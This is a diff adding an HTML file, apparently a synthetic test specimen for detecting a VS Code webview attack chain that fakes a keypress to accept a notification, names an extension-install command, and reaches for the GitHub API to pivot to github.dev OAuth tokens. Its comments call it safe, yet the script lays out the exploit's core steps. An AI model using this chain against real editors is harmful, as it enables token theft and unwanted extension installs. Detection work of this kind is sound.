@@ -1,0 +1,37 @@
+<!--
+  Synthetic specimen for VSCode_GitHub_Token_Theft_WebviewChain.
+  Models the webview JS payload from the Askar PoC: VS Code webview
+  message-passing tokens, synthetic Ctrl+Shift+A keypress, and a target
+  command (install extension). SAFE — no real network calls or installs.
+-->
+<!doctype html>
+<html><head><meta charset="utf-8"><title>readme</title></head>
+<body>
+<script>
+  // Pretend webview-side bootstrap
+  const vscode = acquireVsCodeApi();
+
+  // Simulate Ctrl+Shift+A — bound in the host to "Notifications: Accept Notification Primary Action"
+  window.dispatchEvent(
+    new KeyboardEvent("keydown", {
+      key: "a", code: "KeyA", keyCode: 65,
+      ctrlKey: true, shiftKey: true
+    })
+  );
+
+  // Bridge synthetic keystroke back up to the main VS Code window
+  // (handleInnerKeydown / hostMessaging.postMessage('did-keydown', ...))
+  function handleInnerKeydown(e) {
+    hostMessaging.postMessage('did-keydown', {
+      key: e.key, code: e.code, keyCode: e.keyCode,
+      ctrlKey: e.ctrlKey, shiftKey: e.shiftKey
+    });
+  }
+  window.addEventListener('keydown', handleInnerKeydown);
+
+  // Eventual target: install attacker extension and pivot to github.dev OAuth
+  const targetCmd = "workbench.extensions.installExtension";
+  fetch("https://api.github.com/user/repos");  // synthetic, no real exfil
+  console.log("https://github.dev/example/example/blob/main/readme.ipynb");
+</script>
+</body></html>
